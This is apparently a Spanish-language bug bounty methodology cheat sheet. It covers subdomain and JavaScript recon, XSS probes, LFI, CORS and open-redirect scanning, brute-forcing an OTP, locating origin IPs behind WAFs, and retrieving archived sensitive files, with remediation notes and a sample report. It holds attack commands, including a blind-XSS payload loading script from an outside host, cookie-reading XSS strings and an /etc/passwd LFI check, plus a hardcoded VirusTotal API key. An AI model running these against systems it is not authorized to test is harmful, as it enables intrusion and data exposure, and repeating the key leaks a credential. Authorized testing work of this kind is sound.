# ***I. Bug Bounty***

`Bug Bounty Methodology` este documento sirve para tener una metodología a la hora de hacer bug bounty en programas BBP (bug bounty program) o VDP (vulnerability disclosure program). Donde encontraras comandos para ayudarte rapidamente a realizar bug bounty desde lo mas básico a lo avanzado.

### 1.1. Encontrar todos subdominios con subfinder de un dominio principal
   - ```bash 
      subfinder -d viator.com -all  -recursive > subdomain.txt
      ```
### 1.2. Usando httpx-toolkit para filtrar subdominio con código HTTP 200 y puertos 80,443,8080,8000,8888
   - ```bash 
      cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
      ```
### 1.3. Usando katana para el reconocimiento pasivo y excluye los recursos estáticos con las extensiones especificadas woff,css,png....
   - ```bash 
      katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt
      ```
### 1.4. Filtrar por extensiones
   - ```bash 
      cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"
      ```
### 1.5. Filtrar extensiones javascript
   - ```bash 
      cat allurls.txt | grep -E "\.js$" >> js.txt
      ```
### 1.6. Usando nuclei para ver encontrar Information disclosure
   - ```bash 
      cat js.txt | nuclei -t /home/paulportanc/nuclei-templates/http/exposures/ 
      ```
### 1.7. Usando nuclei para ver encontrar Information disclosure en un sitio web
   - ```bash 
      echo www.viator.com | katana -ps | grep -E "\.js$" | nuclei -t /home/paulportanc/nuclei-templates/http/exposures/ -c 30
      ```
### 1.8. Buscar con dirsearch directorios ocultos vulnerables
   - ```bash 
      dirsearch  -u https://www.viator.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json
      ```
   - ```bash 
      dirsearch -u https://example.com -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1
      ```
### 1.9. Buscar con subfinder, httpx, katana, gf, bxss en el sitio web vulnerabilidades xss
   - ```bash 
      subfinder -d viator.com | httpx-toolkit -silent |  katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters
      ```
### 1.10. Ver certificados SSL vulnerable
   - ```bash 
      subzy run --targets subdomains_alive.txt --verify_ssl
      ```
   - ```bash 
      subzy run --targets subdomains_alive.txt --concurrency 100 --hide_fails --verify_ssl
      ```     
### 1.11. CORS
   - ```bash 
      python3 corsy.py -i /home/paulportanc/vaitor/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
      ```
### 1.12. CORS con Nuclei
   - ```bash 
      nuclei -list subdomains_alive.txt -t /home/paulportanc/Priv8-Nuclei/cors
      ```
### 1.13. Nuclei
   - ```bash 
      nuclei  -list ~/vaitor/subdomains_alive.txt -tags cve,osint,tech
      ```
### 1.14. LFI
   - ```bash 
      cat allurls.txt | gf lfi | nuclei -tags lfi
      ```
### 1.15. OR Open Redirect
   - ```bash 
      cat allurls.txt | gf redirect | openredirex -p /home/paulportanc/openRedirect
      ```
### 1.16. CRLF
   - ```bash 
      cat subdomains_alive.txt | nuclei -t /home/paulportanc/Priv8-Nuclei/crklf/crlf2.yaml -v
      ```
### 1.17. Shortscan
   - ```bash 
      shortscan https://www.dominio.com/ -F
      shortscan https://otrosubdominio.dominio.com/ -F
      ```
### 1.18. HTTPX. 
   - Utilizar **Httpx** para encontrar **LFI**. Este comando que le mostrará todas las urls vulnerables lfi en la pantalla, básicamente etc/passwd archivo de contraseña en la respuesta y mostrar todas las urls en la pantalla.
   - ```bash
      echo 'https://ejemplo.com/index.php?page=' | httpx-toolkit -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr "root:(x|\|\$[^\:]):0:0:"
      ```
### 1.19. WFUZZ. 
   - Utilizar **wfuzz** para fuerza bruta.
   - ```bash
      wfuzz -d '{"email":"hapihacker@email.com", "otp":"FUZZ","password":"NewPassword1"}' -H 'Content-Type: application/json' -z file,/usr/share/wordlists/SecLists-master/Fuzzing/4-digits-0000-9999.txt -u http://crapi.apisec.ai/identity/api/auth/v2/check-otp --hc 500
      ```
### 1.20. SHODAN. 
   - Obtener todas las IPs de Shodan sin ninguna cuenta premium. Una vez estando en Shodan en Facet Analysis, precionar F12 e ir a Console y escribir: **allow pasting**. Copiar el siguiente código
   - ```bash
      var ipElements=document.querySelectorAll('strong');var ips=[];ipElements.forEach(function(e){ips.push(e.innerHTML.replace(/["']/g,''))});var ipsString=ips.join('\n');var a=document.createElement('a');a.href='data:text/plain;charset=utf-8,'+encodeURIComponent(ipsString);a.download='shodanips.txt';document.body.appendChild(a);a.click();
      ```
### 1.21. APIs. 
   - Enumerar la superficie de ataque, obtener API KEYS y puntos finales de API en Móviles. Descarga el .apk usando APKCombo o APKPure. Escaneo de archivos APK en busca de URI, puntos finales y secrets. Validar API KEY encontrada con nuclei
   - ```bash
      apkleaks -f com.EJEMPLO.COM.apk -o output_endpoints_apikeys
      nuclei -t nuclei-templates/http/token-spray -var token=<API_KEY_FOUND>
      ```
### 1.22. Otra forma de encontrar subdominios. 
   - ```bash 
      subfinder -dL domains.txt -all -recursive -o subdomains.txt
      ```
### 1.23. crt.sh. 
   - Certificate Search
   - ```bash
      https://crt.sh
      %.dominio.com -> clic en search
      ```
### 1.24. crt.sh. 
   - ```bash
      curl -s https://crt.sh/\?q\=\amazon.com\&output\=json | jq -r '.[].name_value' | grep -Po '(\w+\.\w+\.\w+)$' | anew subdomains.txt
      ```
### 1.25. Httpx. 
   - ```bash
      cat subdomains.txt | httpx-toolkit -l subdomains.txt -ports 443,80,8080,8000,8888 -threads 200 > subdomains_alive.txt
      ```
### 1.26. Naabu. 
   - ```bash
      naabu -list subdomains-txt -c 50 -nmap-cli 'nmap -sV -sC' -o naabu-full.txt
      ```
### 1.27. Dirsearch
   - ```bash 
      dirsearch  -l subdomains_alive.txt -x 500,502,429,404,400 -R 5 --random-agent -t 100 -F -o directory.txt -w /home/paulportanc/oneforall/onelistforallshort.txt
      ```
### 1.28. Gau
   - ```bash 
      cat subdomains_alive.txt | gau > params.txt
      cat params.txt | uro -o filterparam.txt
      cat filterparam.txt | grep ".js$" > jsfiles.txt
      cat jsfiles.txt | uro | anew jsfiles.txt
      ```
### 1.29. Secret
   - ```bash 
      cat jsfiles.txt | while read url; do python3 /home/paulportanc/SecretFinder/SecretFinder.py -i $url -o ci >> secret.txt; done
      ```
     
-------------------------------------------------------------------------------------------------


# ***II. XSS***

`XSS Methodology` herramientas utilizadas.
- https://github.com/lc/gau   |   https://github.com/tomnomnom/gf   |   https://github.com/coffinxp/gFpattren   |   https://github.com/s0md3v/uro   |   https://github.com/KathanP19/Gxss   |   https://github.com/Emoe/kxss   |   https://github.com/coffinxp/loxs

### 2.1. Encontrar un campo de entrada como un buscar en una web, primero copiar un texto y si sale not found, con control + U vemos en el código fuente si el texto se guarda en el value.
   - ```bash 
      snow"><img src/onerror=prompt(document.cookie)>
      ```
### 2.2. Automatizando.
   - Buscamos mas campos que sean vulnerables a XSS
     ```bash 
      echo https://www.ejemplo.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt
     ```
   - De los campos encontrados extraemos hasta donde inicia la busqueda para pasarlo por la herramienta de loxs
     ```bash 
      cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*/=' | sort -u > final.txt
      cat final.txt
      https://www.ejemplo.com/analog-watches?page=
      https://www.ejemplo.com/boxers?page=
      https://www.ejemplo.com/search?seach_key=
      https://www.ejemplo.com/home-storage-supplies?page=
      https://www.ejemplo.com/wall-clock?page=
      ....       
     ```     
   - Mover el archivo final.txt al directorio donde esta la herramienta loxs https://github.com/coffinxp/loxs
     ```bash 
      mv final.txt loxs
      cd loxs
      python loxs.py
     ```     
   - Elegir la opción 4 de la herramienta XSS Scanner. En la primera pregunta escribimos final.txt que buscara nuestro archivo que hemos movido al directorio de la herramienta. Y en la segunda pregunta escogemos e payload xss.txt, finalmente en el tiempo por cada solicitud damos enter.
     ```bash 
      [?] enter the pat to the input file containing URLs (or press enter to enter a single UR): final.txt
      [?] Enter the path to the payloads file: payloads/xss.txt
      Enter the timeout duration for each request (Press Enter for 0.5): "Presionar enter"
     ```
### 2.3. XSS Reflejado.
   - XXS reflejado con zero click en un '<'input'>' vulnerable
     ```bash 
      hola" " onfocus="alert(document.domain)" autofocus="
     ```
### 2.4. XSS Almacenado.
   - Crea un fichero en linux y luego sube ese archivo a través de un cargador, tendrás un XSS almacenado si el nombre del archivo está almacenado y el desarrollador se ha olvidado de desinfectar este campo.
     ```bash 
      touch '"><img src=x onerror=alert("xss!")>.pdf'
     ```

### 2.5. XSS Almacenado.
   - Ejemplos
     ```bash 
      https://www.youtube.com/watch?v=wCBJGHQBplY
      https://www.youtube.com/watch?v=cFlYGT2rom8
      https://www.youtube.com/watch?v=Yf61jB1U04k
      https://www.youtube.com/watch?v=AA9BU9MyoTs
     ```
   - XSS con URL Encoding
     ```bash 
      https://www.youtube.com/watch?v=s96Dos8i8Qg
     ```


-------------------------------------------------------------------------------------------------


# ***III. JavaScript Reconocimiento***

### 3.1. Extraer todos los endpoint js.
   - ```bash 
      katana -u ejemplo.com -d 5 -jc | grep '\.js$' | tee alljs.txt
      ```
### 3.2. Obtener todas las URLs conocidas relacionadas con el dominio desde varias fuentes públicas y agregamos las nuevas URLs al archivo alljs.txt.
   - ```bash 
      echo ejemplo.com | gau | grep '\.js$' | anew alljs.txt
      ```
### 3.3. Comprobar las URLs listadas, seleccionando solo las que devuelven un código HTTP 200 (OK).
   - ```bash 
      cat alljs.txt | uro | sort -u | httpx-toolkit -mc 200 -o ejemplo.txt
      ```
### 3.4. Analizar los archivos JavaScript en busca de fugas de información.
   - ```bash 
      cat ejemplo.txt | jsleaks -s -l -katana
      ```
### 3.5. Escaneo de vulnerabilidades usando la plantilla especificada para buscar divulgación de credenciales. -c 30: Corre 30 hilos en paralelo para mayor velocidad
   - ```bash 
      cat ejemplo.txt | nuclei -t prsnl/credentials-disclosure-all.yaml -c 30
      ```
### 3.6. Similar al comando anterior, pero utiliza una plantilla diferente (http/exposures) para buscar exposiciones de datos.
   - ```bash 
      cat ejemplo.txt | nuclei -t /home/paulportanc/nuclei-template/http/exposures -c 30
      ```
### 3.7. Final.
   - ```bash 
      cat ejemplo.txt | xargs -I{} bash -c 'echo -e "\ntarget: {}\n' && python lazyegg.py "{}" --js_urls --domains --ips --leaked_creds --local_storage'
      ```

-------------------------------------------------------------------------------------------------


# ***IV. Encontrar la IP de origen de cualquier sitio web detrás de un waf***

### Paso 1: Encontrar la IP Origen.

1. Analizar el sitio web con la extensión Wappalyzer el sitio web.
2. Analizar el sitio web con la extensión Shodan para ver la dirección IP. Y acceder al sitio web con la IP que indica (puede que muestre una página de error, lo que significa que no se puede acceder a la IP directa).
3. Copiar el nombre del dominio y analizar en la terminal usando ping. Se podrá ver la IP del cloudfront y no del sitio web.
   ```bash
   ping ejemplo.com
   PING emeplo.com (XX.XX.XX.XX) 56 bytes of data.
   64 byte from server-XX-XX-XX-XX.del54.r.cloudfront.net 
   ```
4. Usar la herramienta de reconocimiento de DNS que a veces realiza bloqueos de DNS inversos. A veces puedes descubrir la IP de origen si el servidor no usa WAF. Sin embargo, en este caso vemos varios servidores cloudfront. Comprobemos las IP una por una del registro A. Ninguno de ellos es directamente accesible. Todos son IPS de Cloudflare
   ```bash
   dnsrecon -d ejemplo.com
   [*] std: Performin General Enumeration against: ejemplo.com...
   [-] DNSSEC is not configured for ejemplo.com
   [*] SOA ns-634.awsdns......
   [*] NS ns-634.awsdns......
   [*] MX ns-634.awsdns......
   [*] A ejemplo.com XX.XX.XX.105
   [*] A ejemplo.com XX.XX.XX.101
   [*] A ejemplo.com XX.XX.XX.45
   [*] A ejemplo.com XX.XX.XX.94   
   ```
5. Realizar un verificacion cruzada con la herramienta WAFW00F para identificarlos
   ```bash
   wafw00f https://ejemplo.com/
   ```
6. El siguiente paso usaré un Shodan Dork para encontrar todos los dominios relacionados. En https:///www.shodan.io/dashboard  copiar el siguiente Dork. Si encontramos resultado acceder a la IP una por una copiando la direccion IP publica y pegando en el navegador y si tiene suerte puedes ver que podras acceder directamente al sitio web con alguna de esas IP.
   ```bash
   Ssl.cert.subject.CN:"ejemplo.com" 200
   ```
   - También puedes usar este dork, te dará el mismo resultado.
   ```bash
   ssl:"ejemplo.com" 200
   ```
   - Ahora hagámoslo más fácil usando una línea de comando que le dará solo el resultado de la dirección IP junto con el título y el servidor.
   ```bash
   shodan search Ssl.cert.subject.CN:"ejemplo.com" 200 --fields ip_str | httpx-toolkit -sc -title -server -td
   ```
7. Si aún no hemos encontrado la IP origen podemos seguir probando otro metodo, en el sitio web https://favicons.teamtailor-cdn.com/#result copiamos el sitio web https://ejemplo.com/
8. Puedes ver que tenemos la URL de favicon de este dominio. Ahora podemos generar su hash usando otro sitio web https://favicon-hash.kmsec.uk. Copiamos solo el dominio del favicon https://ejemplo.com/favicon.ico en Retrieve from URL y generamos su hash md5.
9. Ahora abramos este hash en shodan, puede que aparezcan resultado como tambien no aparecieron resultados para este hash.
10. Verificar el hash generado en Censys. La misma pagina de https://favicon-hash.kmsec.uk te da la opcion de buscar en Shodan, VirusTotal y Censys. Puede que obtengas resultados, acceder a esas IP una por una.
11. Comprobar el historial de IP del sitio web usando un sitio web de información de DNS https://viewdns.info y en la parte que dice IP History copiar el nombre del dominio ejemplo.com. Verá una lista de IP históricas. Puede probar estas IP una por una.
12. Otro sitio web para probar es verificar el registro SPF de un dominio, simplemente copie el dominio ejemplo.com en https://mxtoolbox.com/SuperTool.aspx?action=dmarc%adrop.com&run=toolpage#. En el boton viene por defecto DMARC Lookup cambiar o seleccionar por SPF Record Lookup.
13. De manera similar, ahora pasemos al siguiente sitio web, SecurityTrails, que uso para verificar los registros de IP https://securitytrails.com/app/account y pegamos el dominio para buscar ejemplo.com y haga clic en Historical Data. Puedes ver que hay tantos registros de IP de este sitio web, puedes copiar estas IP y comprobar si se puede acceder directamente a ellas o no.
14. En Censys https://search.censys.io ingresamos el dominio ejemplo.com y buscamos. Verás muchos resultados tanto con ipv4 como con ipv6.
15. También podemos utilizar FOFA https://en.fofa.info, otra excelente herramienta para encontrar IP. Solo copiamos el nombre del dominio "ejemplo.com". Podemos filtrarlo con el favicon del sitio para obtener resultado de ese sitio web.
16. Ahora pasemos a ZoomEye https://www.zoomeye.hk/v2/, que es otra gran alternativa para mostrar IPs, solo copiar el dominio "ejemplo.com" y hacer clic en buscar.
5. Otro método efectivo implica el uso de virus total, una excelente herramienta para descubrir subdominios y direcciones IP asociadas. Para comenzar, simplemente pegue el dominio en el parámetro de dominio y presione Entrar
   ```bash
   Ssl.cert.subject.CN:"ejemplo.com" 200
   ```
   ```bash
   https://www.virustotal.com/vtapi/v2/domain/report?apikey=3c8812a869db20881601fc05d21a3ac8baca9a3f243357af29923c739c93a62f&domain=dell.com
   ```
   - Cambiar dell.com por el sitioweb ejemplo.com.
   - Como notará, virustotal proporciona una gran cantidad de información, incluidas muchas direcciones IP que el sitio web resuelve; sin embargo, verificar manualmente todas estas IP puede ser un desafío. Para facilitar este proceso, con este comando simple de una sola línea que recupera todas las direcciones IP usando una terminal, solo necesita copiar el comando y pegarlo en la terminal. Al instante verá una lista de direcciones IP obtenidas del sitio web.
      ```bash
      curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=ejemplo.com&apikey=3c8812a869db20881601fc05d21a3ac8baca9a3f243357af29923c739c93a62f" | jq -r '.. | .ip_address? // empty' | grep -Eo'([0-9]{1,3}\.){3}[0-9]{1,3}'
      ```
   - Estoy usando httpx para este script, lo que hace que sea conveniente verificar qué IP son válidas y accesibles.
      ```bash
      curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=ejemplo.com&apikey=3c8812a869db20881601fc05d21a3ac8baca9a3f243357af29923c739c93a62f" | jq -r '.. | .ip_address? // empty' | grep -Eo'([0-9]{1,3}\.){3}[0-9]{1,3}' | httpx-toolkit -sc -td -title -server
      ```
   - También puedes usar otro mismo trazador de líneas para buscar subdominios.
      ```bash
      curl -s "https://www.virustotal.com/vtapi/v2/domain/report?apikey=3c8812a869db20881601fc05d21a3ac8baca9a3f243357af29923c739c93a62f&domain=ejemplo.com" | jq -r '.domain_siblings[]'
      ```      
18. Ahora pase al siguiente método. Utilizo AlienVault para esto. También es bueno para encontrar el sitio web IP de origen. Simplemente cambie el dominio y presione enter: 
     ```bash
      https://otx.alienvault.com/api/v1/indicators/hostname/ejemplo.com/url_list?limit=500&page=1
    ```
    - Tambien puede utilizar este oneliner. Opcional puede agregar httpx-toolkit para verificar qué IP son válidas y accesibles.
      ```bash
      curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/ejemplo.com/url_list?limit=500&page=1" | jq -r '.url_list[]?.result?.urlworker?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | httpx-toolkit -sc- td -title
      ```
19. Ahora, por último, pero no menos importante, también puedes probar el escaneo con urlscan para encontrar la IP de origen, simplemente cambia el dominio e ingresa.
     ```bash
      https://urlscan.io/api/v1/search/?q=domain:ejemplo.com&size=10000
    ```
    - Tambien puede utilizar este oneliner. Opcional puede agregar httpx-toolkit para verificar qué IP son válidas y accesibles.
      ```bash
      curl -s "https://urlscan.io/api/v1/search/?q=domain:ejemplo.com&size=10000" | jq -r '.result[]?.page?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | httpx-toolkit -sc- td -title -server
      ```

### Paso 2: IP Origen encontrada.

1. Comprobarlo usando la extensión Wappalyzer que no hay cloudfront en el sitio web con la IP encontrada.
2. Para verificar más, consulta con la herramienta wafw00f y podras ver que no hay ningún waf.
   ```bash
   wafw00f XX.XX.XX.XX
   ```
3. Inspeccionemos también el certificado usando nmap. Se confirma que la IP apunta al sitio web
   ```bash
   nmap --script ssl-cert -p 443 XX.XX.XX.XX
   ssl-cert: Subject: commonName=*.ejemplo.com
   Subject Alternative Name: DNS:*.ejemplo.com, DNS: ejemplo.com
   ```
4. Agregar las IP origen al /etc/hosts para que cuando carge en el navegador resuelva con la IP origen y no con Cloudfare


-------------------------------------------------------------------------------------------------


# ***V. Encontrar errores de divulgación de información | Cómo acceder a archivos 404 de cualquier servidor***

### Metodologia.

1. Recuperar todas las URL pasivas del dominio de destino utilizando la Wayback machine. Simplemente cambie el nombre de dominio a su objetivo. En este punto puedes buscar manualmente un archivo específico como pdf, csvc, archivos db y más para identificar vulnerabilidades de divulgación de información.
   ```bash
   https://web.archive.org/cdx/search/cdx?url=*.nasa.gov/*&collapse=urlkey&output=text&fl=original 
   ```
2. Este comando hace lo mismo pero de manera mas eficiente con una soli linea de codigo.
   ```bash
   curl -G "https://web.archive.org/cdx/search/cdx" --data-urlencode "url=*.ejemplo.com/" --data-urlencode "collapse=urlkey" --data-urlencode "output=text" --data-urlencode "fl=original" > out.txt 
   ```
3. Este otro comando oneliner para buscar nombres de archivos confidenciales.
   ```bash
   cat out.txt | uro | grep -E '\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5|\.exe|\.dll|\.bin|\.ini|\.bat|\.sh|\.tar|\.deb|\.rpm|\.iso|\.img|\.apk|\.msi|\.dmg|\.tmp|\.crt|\.pem|\.key|\.pub|\.asc' 
   ```
4. Si encuentran un archivo y cuando quieren abrir aparece Not found error 404. Mientras mucha gente se detiene aquí te mostraré un método de oro para recuperar estos archivos. Copie la URL que aparece el error 404, vaya a web https://web.archive.org y pegue la URL en la barra de búsqueda. Navegue en la  línea de tiempo y busque el archivado que tiene un snapshot en un fecha, y haga clic. Como vera puedes verlo aunque el archivo ya no esté en el servidor del sitio web, aún podemos acceder a él desde el archivo anterior.
5. Además, puede usar virustotal para búsquedas similares, simplemente reemplace el dominio por su dominio de destino y enumerará todas las URL asociadas, busque archivos con una extensión interesante y, si dan como resultado errores 404, verifique en Wayback Machine el archivo de línea de tiempo anterior. De manera similar, puede usar Alien Vault. para buscar URL y archivos de la misma manera que encontramos el archivo 404, simplemente verifíquelos en el camino de regreso.
   ```bash
   https://www.virustotal.com/vtapi/v2/domain/report?apikey=3c8812a869db20881601fc05d21a3ac8baca9a3f243357af29923c739c93a62f&domain=example.com 
   ```
   ```bash
   https://otx.alienvault.com/api/v1/indicators/hostname/example.com/url_list?limit=500&page=1 
   ```
6. Otras opciones 1: **Katana**. Para encontrar documentos confidenciales, sensibles y a datos de PII.
   ```bash
   katana -u subdomainsList -em pdf,docx | tee endpointsPDF_DOC
   grep -i 'redacted.*\.pdf$' endpointsPDF_DOC | sed -E 's/[-_]?redacted//gi' | sort -u | httpx -mc 200 -sc
   ```
7. Otras opciones 2: **Gau**. Encontrar información Divulgación (***Information Disclosure***): Expresión regular..
   ```bash
   echo https://sksc.somaiya.edu | gau | grep -E "\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|tar|xz|7zip|p12|pem|key|crt|csr|sh|pl|py|java|class|jar|war|ear|sqlitedb|sqlite3|dbf|db3|accdb|mdb|sqlcipher|gitignore|env|ini|conf|properties|plist|cfg)$"

   echo https://sksc.somaiya.edu | gau | grep -E "\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5"
   ```
8. Otras opciones 3: **Google Dorks**.
   - Para encontrar datos de PII o información reservada para los procesos de negocio
   ```bash
   site:*.EJEMPLO.COM (ext:doc OR ext:docx OR ext:pdf OR ext:rtf OR ext:ppt OR ext:csv OR ext:xls) (intext:confidential OR intext:privileged OR intext:unredacted OR intext:secret OR intext:reserved)
   ```
   - Para encontrar errores en SQLi.
   ```bash
   site:testphp.vulnweb.com intext:"sql syntax near" OR intext:"syntax error" OR intext:"unexpected end of SQL" OR intext:"Warning: mysql_" OR intext:"pg_connect()" OR intext:"error in your SQL syntax" OR intext:"OLE DB Provider for SQL Server"

   site:*.dell.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)
   ```
   
### Remediación.
Cuando una empresa descubre que los usuarios están accediendo a versiones antiguas o archivadas de su sitio web a través de plataformas como Wayback Machine (web.archive.org), puede tomar varias medidas para prevenir o mitigar esta situación. Así es como las empresas pueden solucionar o abordar este problema:

1. <ins>Solicitar eliminación de archivos web</ins>
   - **Método:** Las empresas pueden solicitar a Internet Archive (que aloja Wayback Machine) que excluya o elimine las páginas de su sitio web del archivo.
   - **Proceso:** pueden enviar una solicitud a través del formulario de eliminación de Internet Archive o incluir una regla de robots.txt que restrinja el rastreo del dominio.
   - **Ejemplo de regla Robots.txt:**
        ```bash
      User-agent: ia_archiver Disallow: /  
      ```
     Esto impide que Wayback Machine archive o entregue copias del sitio.

2. <ins>Mejora de la seguridad del lado del servidor</ins>
   - Implemente políticas de seguridad de contenido (CSP) y controles para garantizar que las versiones antiguas del sitio no puedan interactuar con los sistemas actuales (por ejemplo, formularios, APIs o bases de datos de back-end).
   - Supervise y elimine periódicamente referencias o enlaces a contenido confidencial en archivos web más antiguos, especialmente si pueden exponer vulnerabilidades.
3. <ins>Deshabilitar las URL Legacy</ins>
   - **Acción:** La empresa puede invalidar las URL existentes eliminando el enrutamiento del lado del servidor para rutas o puntos finales obsoletos.
Esto garantiza que incluso si los usuarios recuperan contenido antiguo, cualquier función interactiva o vinculada dejará de funcionar.
4. <ins>Actualización de Políticas Legales</ins>
   - Las empresas pueden actualizar sus términos de servicio o utilizar avisos legales para indicar que las versiones antiguas de su sitio web no son legalmente vinculantes ni válidas para ningún propósito oficial.
   - Esto puede reducir la responsabilidad y establecer expectativas para los usuarios.
5. <ins>Auditoría de vulnerabilidades</ins>
   - La empresa debe auditar la versión anterior del sitio web para determinar si hay información confidencial, código roto o vulnerabilidades explotables.
   - Después de identificar los riesgos, pueden:
      - Cierre los puntos finales no utilizados.
      - Corrija viejos exploits o errores que aún puedan estar activos en los sistemas actuales.  
6. <ins>Redirigir solicitudes de archivo</ins>
   - Las empresas pueden utilizar redirecciones HTTP 301/302 para redirigir URL antiguas a una página estándar o a la página de inicio del sitio web.
   - Ejemplo usando .htaccess: 
     ```bash
      Redirect 301 /old-path https://www.newsite.com  
      ``` 
7. <ins>Mejora de los sistemas de autenticación</ins>
   - Para sitios con datos dinámicos o confidenciales (por ejemplo, portales, dashboards), la empresa debe aplicar sistemas sólidos de autenticación y autorización.
   - Las páginas archivadas no deben exponer sesiones de usuarios activas o explotables.
8. <ins>Monitoreo proactivo</ins>
   -Utilice herramientas como rastreadores web, análisis o servicios de monitoreo para detectar cuándo se accede con frecuencia a páginas antiguas, especialmente si estas páginas generan un tráfico significativo desde los servicios de archive.
9. <ins>Campañas educativas y de sensibilización</ins>
   - Informar a los usuarios que el contenido de plataformas como Wayback Machine puede estar desactualizado o ser inexacto. Esto se puede hacer a través de banners, disclaimers o correos electrónicos.

<ins>Cómo funciona esto en la práctica</ins>
El método de parche específico depende del tipo de riesgo que plantea el archivo antiguo:
   - **Riesgo de contenido estático:** actualice o elimine el contenido y solicite su eliminación de web.archive.org.
   - **Riesgo interactivo (por ejemplo, API):** deshabilite o modifique la funcionalidad del lado del servidor para evitar la interacción con código antiguo. 
Si la empresa cree que existe una infracción o explotación grave, puede escalarla consultando a profesionales de ciberseguridad o a un asesor legal.

### Reporte en BBP/VDP.

1. <ins>Bug Description:</ins>
   - While using waybackurls to enumerate URLs from a specific site, I discovered numerous .zip, .pdf, and .xls files. However, when attempting to access these files via their direct URLs, they consistently returned a 404 Not Found error. To further investigate, I accessed the URLs through the Web Archive and successfully retrieved the files by selecting earlier snapshots of the site. This indicates that the files, although no longer available directly, exist in archived versions of the site.

2. <ins>Steps to Reproduce:</ins>
   1.  Use waybackurls to extract URLs from the target site.
   2.  Identify URLs for .zip, .pdf, or .xls files.
   3.  Attempt to access the files through their direct URLs in a browser or using a tool like curl. Observe the 404 Not Found error.
   4.  Navigate to Web Archive.
   5.  Enter the inaccessible URL in the search bar.
   6.  Select an older snapshot of the URL.
   7.  Download the file successfully from the archive.

   - Direct URLs return a 404 Not Found error, but files are retrievable from older snapshots in the Web Archive.

 3. <ins>Impact:</ins>
      - Users are unable to access potentially critical resources through their original URLs. This could lead to user frustration, loss of trust, and inefficiency in retrieving historical data.

 4. <ins>Attachments:</ins>
      - Example URLs showing the issue.
      - Screenshots of the 404 error.
      - Screenshots of successful downloads from Web Archive.
    
    Please address this issue to improve user experience and ensure data accessibility.
    Removing content from the Wayback Machine (Web Archive) involves specific steps, as the archive is designed to preserve web content for public access. Website owners or authorized parties can request removal if they have a valid reason, such as sensitive or outdated information, copyright issues, or legal compliance. Below are the details on how this can be done:

5. <ins>Steps to Remove Content from the Wayback Machine</ins>
   1. Contact Internet Archive Directly.
         - Website owners can submit a request to the Internet Archive to remove specific pages or files. This is typically done via email to their designated support team:
         Email: info@archive.org
         - Include the following details in your request:
            - The exact URL(s) to be removed.
            - The reason for the removal (e.g., copyright infringement, sensitive content, outdated information).
            - Proof of ownership of the website (e.g., ability to edit DNS records, email correspondence from the domain).
   3. Use the robots.txt File
         - Update the website's robots.txt file to disallow the Internet Archive’s crawler from archiving the site or specific pages.
         - Example:
           ```bash
           User-agent: ia_archiver
           Disallow: /
           ``` 
         - Once this is done, notify the Internet Archive that you’ve updated the robots.txt file and request the removal of existing snapshots. They respect robots.txt directives.
   4. Legal Takedown Notice
         - If the content violates laws or copyrights, a DMCA takedown notice or similar legal notice can be submitted to the Internet Archive.
         - Provide all relevant legal documentation and details about the infringement to strengthen your case.
   5. Check Host-Level Restrictions
         - If the content was hosted by a third-party provider, request that the hosting provider also take steps to block or remove access from their end.

6. <ins>Mitigation if Removal is Not Possible</ins>
   1.  Redirect to Updated Content:
         - Ensure users landing on outdated links are redirected to a current version or alternative content.
   2.  Proactive Management:
         - Regularly monitor and manage outdated or sensitive content to prevent unnecessary archiving in the future.

6. <ins>Important Notes</ins>
   -  Only website owners or authorized parties can request content removal.
   -  Internet Archive may deny requests that do not meet their policies or involve public interest material.

-------------------------------------------------------------------------------------------------


# ***VI. Cómo acceder a archivos 404 | Encontrar datos confidenciales en archivos PDF | Vulnerabilidad de divulgación de información***

1. Webarchive.
   ```bash
   https://web.archive.org/cdx/search/cdx?url=*.nasa.gov/*&collapse=urlkey&output=text&fl=original 
   ```
2. Curl.
   ```bash
